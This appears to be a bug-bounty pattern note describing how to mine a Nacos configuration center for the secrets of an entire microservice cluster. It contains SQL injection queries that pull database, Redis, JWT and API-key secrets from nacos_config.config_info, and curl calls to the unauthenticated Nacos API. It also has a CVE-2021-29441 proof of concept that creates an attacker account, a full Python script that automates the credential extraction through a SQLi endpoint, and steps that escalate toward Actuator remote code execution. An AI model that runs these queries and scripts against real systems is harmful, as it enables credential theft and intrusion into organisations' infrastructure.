---
type: pattern
title: "Pattern - Nacos Config Mining"
name: Nacos Config Database Mining -- Extracting Attack Surface from Configuration Center
description: When you have MySQL SQLi (or direct Nacos API access), nacos_config.config_info stores all microservice Spring Boot configurations, including DB creds, Redis creds, management endpoint paths, external hosts, Actuator exposure scope, and complete infrastructure intelligence
cwe: CWE-200
severity: P1 Critical (depending on subsequent exploitation)
cvss_range: "7.5 (direct credential leak) -> 10.0 (combined with Actuator RCE)"
last_updated: 2026-05-13
tags:
  - bb-pattern
  - nacos
  - spring-cloud
  - config-server
  - sqli
  - information-disclosure
  - credential-leak
  - actuator-discovery
status: active
---

# Pattern -- Nacos Config Database Mining

> **Core insight**: The Nacos configuration center is the "password book" of a microservice architecture. Once you can access the `nacos_config` database, you effectively have all passwords and configurations for the entire microservice cluster.

---

## What is Nacos Config?

Nacos is Alibaba's open-source service discovery and configuration management platform, widely used in Java microservice architectures.
- Database: `nacos_config` (MySQL)
- Core table: `config_info` (centralized storage of all microservices' `application.properties` / `application.yml`)
- Each microservice pulls configuration from Nacos at startup; configs contain connection info for all external dependencies

---

## Pathways to Access Nacos

### Pathway A: Via SQLi (most common)

If you have arbitrary MySQL SELECT via SQLi (even read-only, no write):

```sql
-- Confirm nacos_config exists
SELECT t.a attributeCode, t.b attributeName
FROM (
  SELECT schema_name a, 'ok' b
  FROM information_schema.schemata
  WHERE schema_name LIKE '%nacos%'
  LIMIT 5
) t
```

### Pathway B: Direct Nacos Admin API Access

Nacos exposes an HTTP API by default (port 8848); if unauthenticated:

```bash
# List all configs
curl "http://nacos-server:8848/nacos/v1/cs/configs?dataId=&group=&pageNo=1&pageSize=100&tenant="

# Get specific config
curl "http://nacos-server:8848/nacos/v1/cs/configs?dataId=application.properties&group=DEFAULT_GROUP"

# CVE-2021-29441: Unpatched versions allow auth bypass
curl "http://nacos-server:8848/nacos/v1/auth/users?pageNo=1&pageSize=9"
```

### Pathway C: Spring Boot Actuator `/nacos-config`

```bash
GET https://target.com/actuator/nacos-config
# or with custom base path
GET https://target.com/custom-base/nacos-config
```

---

## Mining Strategy: nacos_config.config_info Extraction

### Step 1: Reconnaissance -- how many services

```sql
SELECT t.a attributeCode, t.b attributeName
FROM (
  SELECT COUNT(*) a, MAX(data_id) b FROM nacos_config.config_info
) t
-- -> e.g.: 26 configs, 1-2 per microservice
```

### Step 2: List all data_ids (service inventory)

```sql
SELECT t.a attributeCode, t.b attributeName
FROM (
  SELECT data_id a, tenant_id b FROM nacos_config.config_info LIMIT 50
) t
```

### Step 3: Mine by keyword (high-value targets)

#### Database Credentials

```sql
SELECT t.a attributeCode, t.b attributeName
FROM (
  SELECT data_id a, SUBSTRING(content, 1, 500) b
  FROM nacos_config.config_info
  WHERE content LIKE '%spring.datasource%'
  LIMIT 10
) t
```

#### Redis / Cache Credentials

```sql
WHERE content LIKE '%spring.redis%'
WHERE content LIKE '%redis.password%'
```

#### RabbitMQ / Kafka Credentials

```sql
WHERE content LIKE '%rabbitmq%'
WHERE content LIKE '%kafka.bootstrap%'
```

#### Elasticsearch Credentials

```sql
WHERE content LIKE '%elasticsearch%'
WHERE content LIKE '%elastic.password%'
```

#### Spring Boot Actuator Configuration (find exposed management endpoints)

```sql
WHERE content LIKE '%management.endpoints.web%'
```

Fields to watch for:
```properties
management.endpoints.web.exposure.include=*          # <- fully open! dangerous
management.endpoints.web.base-path=/custom-path      # <- custom path
management.endpoints.jmx.exposure.include=*          # <- JMX fully open
swagger.host=target-pre.example.com/gateway          # <- external URL!
```

#### JWT / OAuth Secrets

```sql
WHERE content LIKE '%jwt.secret%'
WHERE content LIKE '%oauth2.client-secret%'
WHERE content LIKE '%token.secret%'
```

#### Third-party Service API Keys

```sql
WHERE content LIKE '%api-key%'
WHERE content LIKE '%api.token%'
WHERE content LIKE '%appSecret%'
```

---

## Key Field Interpretation Guide

### `swagger.host` -> External URL

```
swagger.host=172.16.1.189:30010/gateway  -> k8s internal NodePort, skip
swagger.host=target-pre.example.com/gateway -> externally reachable! this is the target
```

### `server.port` -> Internal port, does not mean externally reachable

```
server.port=9205  -> k8s internal Pod port, needs Service/Ingress to be external
```

### `spring.cloud.nacos.config.server-addr` -> Nacos server address

```
spring.cloud.nacos.config.server-addr=34.80.2.115:8848  -> try direct access!
spring.cloud.nacos.config.server-addr=172.16.1.189:31848 -> k8s internal, skip
```

---

## Complete Mining Script (SQLi environment)

```python
import urllib.parse, requests, json

BASE = "https://target.example.com/api/servicegroup/getattribute"

def sqli_query(sql):
    """Execute SELECT via SQLi and return results"""
    # subquery wrapper pattern
    wrapped = f"SELECT t.a attributeCode,t.b attributeName FROM ({sql}) t"
    params = {"mySQL": wrapped}
    r = requests.get(BASE, params=params, verify=False, timeout=15)
    return r.json()

# Mining order
QUERIES = {
    "db_creds": "SELECT data_id a, SUBSTRING(content,1,500) b FROM nacos_config.config_info WHERE content LIKE '%spring.datasource.password%' LIMIT 10",
    "redis_creds": "SELECT data_id a, SUBSTRING(content,1,500) b FROM nacos_config.config_info WHERE content LIKE '%spring.redis%' LIMIT 10",
    "actuator": "SELECT data_id a, SUBSTRING(content,1,800) b FROM nacos_config.config_info WHERE content LIKE '%management.endpoints.web.base-path%' LIMIT 20",
    "jwt": "SELECT data_id a, SUBSTRING(content,1,300) b FROM nacos_config.config_info WHERE content LIKE '%jwt.secret%' LIMIT 10",
    "rabbitmq": "SELECT data_id a, SUBSTRING(content,1,400) b FROM nacos_config.config_info WHERE content LIKE '%rabbitmq%' LIMIT 10",
    "es_creds": "SELECT data_id a, SUBSTRING(content,1,400) b FROM nacos_config.config_info WHERE content LIKE '%elasticsearch%' LIMIT 10",
}

for category, sql in QUERIES.items():
    results = sqli_query(sql)
    print(f"\n=== {category} ===")
    for r in results:
        print(f"SERVICE: {r['attributeCode']}")
        print(r['attributeName'][:300])
        print()
```

---

## A->B Signal: What to do immediately after finding management config

```
Discover management.endpoints.web.exposure.include=*
|
Step 1: Find swagger.host to confirm external URL
        (not server.port! that is the internal port)
|
Step 2: Confirm nginx prefix routing
        curl -sk https://<swagger.host.domain>/<swagger.host.path>/<base-path>
        -> 200 -> Actuator reachable
|
Step 3: List available endpoints
        GET /<base-path> -> inspect _links
|
Step 4: Check for gateway, heapdump, env
        Has gateway -> CVE-2022-22947 RCE chain
        Has heapdump -> Plaintext credential warehouse
        Has env POST -> Environment variable injection
```

---

## Nacos's Own Vulnerabilities

| CVE | Impact | Description |
|-----|--------|-------------|
| CVE-2021-29441 | Nacos < 1.4.1 | Unauthenticated user creation (`User-Agent: Nacos-Server`) |
| CVE-2021-29442 | Nacos < 1.4.1 | Derby JDBC admin bypass |
| Nacos OGNL injection | Nacos < 2.1.x | OGNL expression execution in config values |

```bash
# CVE-2021-29441 PoC
curl -X POST "http://nacos:8848/nacos/v1/auth/users" \
  -H "User-Agent: Nacos-Server" \
  -d "username=attacker&password=P@ss123"
```

---

## Related

- [[Pattern - Spring Boot Actuator Unauth RCE]] -- Exploitation chain after finding actuator config
- [[Pattern - Hardcoded Credentials]] -- Various hardcoded credentials commonly found in Nacos
- [[Pattern - SSRF Cloud K8s Attack Chain]] -- Exploitation after obtaining k8s cluster token
